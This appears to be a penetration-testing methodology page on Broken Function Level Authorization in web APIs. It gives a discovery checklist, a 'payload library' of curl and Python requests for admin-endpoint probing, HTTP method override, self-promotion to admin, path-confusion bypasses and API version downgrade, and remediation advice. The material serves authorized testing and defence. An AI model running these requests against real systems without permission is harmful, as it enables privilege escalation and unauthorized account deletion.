---
title: "Broken Function Level Authorization (BFLA)"
date: 2026-02-24
draft: false
---

# Broken Function Level Authorization (BFLA)

> **Severity**: High–Critical | **CWE**: CWE-285, CWE-269
> **OWASP API Top 10**: API5:2023 – Broken Function Level Authorization

---

## What Is BFLA?

BFLA (Broken Function Level Authorization) occurs when users can access **functions/endpoints they shouldn't** based on their role — e.g., a regular user calling admin APIs. Unlike BOLA (accessing another object), BFLA is about accessing **privileged operations**.

```
Regular user token → GET /api/users/me        → 200 OK (correct)
Regular user token → GET /api/admin/users     → should be 403
                  → but returns 200 with all users → BFLA

Or:
Regular user → DELETE /api/users/1337          → should be 403
             → returns 204 No Content          → BFLA
```

---

## Discovery Checklist

- [ ] Map all endpoints from JS, Swagger/OpenAPI, API docs, traffic
- [ ] Identify admin/privileged endpoints: `/admin`, `/internal`, `/manage`, `/staff`
- [ ] Test all "restricted" endpoints with low-privilege token
- [ ] Test all HTTP methods on every endpoint (GET→POST→PUT→PATCH→DELETE)
- [ ] Test API version downgrade (v2 protected, v1 not)
- [ ] Test HTTP method override headers
- [ ] Test path confusion (capitalization, trailing slash, double slash)
- [ ] Test direct object manipulation to trigger privileged operations
- [ ] Compare responses: authenticated admin vs authenticated user
- [ ] Test GraphQL mutations with user token (see 83_GraphQL_Full.md)

---

## Payload Library

### Attack 1 — Admin Endpoint Access

```bash
# Test admin paths with regular user token:
ENDPOINTS=(
  "/admin/users"
  "/admin/settings"
  "/api/admin/dashboard"
  "/api/v1/admin/users"
  "/management/users"
  "/internal/config"
  "/staff/reports"
  "/superadmin"
  "/api/users?role=admin"   # role filter
  "/api/audit-log"
  "/api/system/health/debug"
)

for path in "${ENDPOINTS[@]}"; do
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://target.com$path" \
    -H "Authorization: Bearer REGULAR_USER_TOKEN")
  echo "$path: $status"
done
```

### Attack 2 — HTTP Method Exploitation

```bash
# Server only protects specific methods:
# GET /api/users/1 → 403 (protected read)
# DELETE /api/users/1 → 204 (DELETE not protected)
# PUT /api/users/1 + body → 200 (PUT not checked)

for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  result=$(curl -so /tmp/resp -w "%{http_code}" \
    -X "$method" "https://api.target.com/v1/admin/users" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}')
  echo "$method: $result $(cat /tmp/resp | head -c 100)"
done

# HTTP method override (when firewall only allows GET/POST):
curl -X POST "https://api.target.com/v1/users/1" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer USER_TOKEN"

curl -X POST "https://api.target.com/v1/users/1" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# _method parameter (Rails/Laravel):
curl -X POST "https://api.target.com/v1/users/1?_method=DELETE" \
  -H "Authorization: Bearer USER_TOKEN"
```

### Attack 3 — Privilege Escalation via Function

```bash
# Escalate own privileges:
# Find: update user role function
curl -X PUT "https://api.target.com/v1/users/MY_ID" \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "permissions": ["*"]}'

# Create admin user (registration without role check):
curl -X POST "https://api.target.com/v1/users" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"pass","role":"admin","isAdmin":true}'

# Promote self via admin endpoint:
curl -X POST "https://api.target.com/v1/admin/users/MY_ID/promote" \
  -H "Authorization: Bearer USER_TOKEN"

# Assign group/team with admin privileges:
curl -X POST "https://api.target.com/v1/teams/ADMIN_TEAM/members" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"user_id": "MY_ID"}'
```

### Attack 4 — Path Confusion Bypass

```bash
# Uppercase bypass (if authorization check is case-sensitive):
curl "https://api.target.com/Admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
curl "https://api.target.com/ADMIN/users"
curl "https://api.target.com/aDmIn/users"

# Trailing slash / double slash:
curl "https://api.target.com/admin/users/"
curl "https://api.target.com//admin/users"
curl "https://api.target.com/api//admin/users"

# Path traversal to reach admin:
curl "https://api.target.com/api/users/../admin/users" \
  -H "Authorization: Bearer USER_TOKEN"
curl "https://api.target.com/api/v1/users/../../admin/users"

# URL encoding:
curl "https://api.target.com/%61dmin/users"     # a → %61
curl "https://api.target.com/adm%69n/users"    # i → %69
curl "https://api.target.com/%2fadmin%2fusers"  # encoded slashes
```

### Attack 5 — API Version Downgrade

```bash
# v2 is protected but v1 is legacy and unprotected:
curl "https://api.target.com/v2/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"   # → 403

curl "https://api.target.com/v1/admin/users" \
  -H "Authorization: Bearer USER_TOKEN"   # → 200?

# Test multiple version formats:
for v in v1 v2 v3 v0 beta alpha 1 2 3; do
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.target.com/$v/admin/users" \
    -H "Authorization: Bearer USER_TOKEN")
  echo "/$v/: $status"
done

# Accept-Version header:
curl "https://api.target.com/admin/users" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Accept-Version: v1"
```

---

## Tools

```bash
# AuthMatrix (Burp extension):
# Define roles, assign tokens, map endpoints
# Auto-test all combinations → shows unauthorized access

# Autorize (Burp extension):
# Replay every request with lower-privilege token
# Highlights responses that match → potential BFLA

# ffuf for endpoint discovery:
ffuf -u "https://target.com/FUZZ" \
  -H "Authorization: Bearer USER_TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
  -mc 200,201,204 -o results.json

# Param Miner (Burp):
# Discover hidden parameters that control function access

# Manual script — test all methods × all endpoints:
python3 -c "
import requests, itertools

token = 'USER_TOKEN'
endpoints = ['/admin/users', '/admin/settings', '/api/export']
methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']
headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}

for ep, m in itertools.product(endpoints, methods):
    r = requests.request(m, f'https://target.com{ep}',
                         headers=headers, json={}, timeout=5)
    if r.status_code not in (403, 405):
        print(f'[!] {m} {ep} → {r.status_code}')
"
```

---

## Remediation Reference

- **Centralized authorization layer**: all function-level access decisions in one place (middleware/policy engine)
- **Default deny**: every function access denied unless explicitly granted to role
- **Role-based access control (RBAC)**: define roles with explicit function permissions, check on every call
- **Do not rely on UI hiding**: removing admin buttons from UI is not access control — enforce at API level
- **Audit all HTTP methods** per endpoint — not just GET/POST
- **API version retirement**: decommission old API versions; redirect with `410 Gone` and enforce same auth controls until removal
- **Regular access control audits**: use automated tools like AuthMatrix in CI/CD pipeline

*Part of the Web Application Penetration Testing Methodology series.*
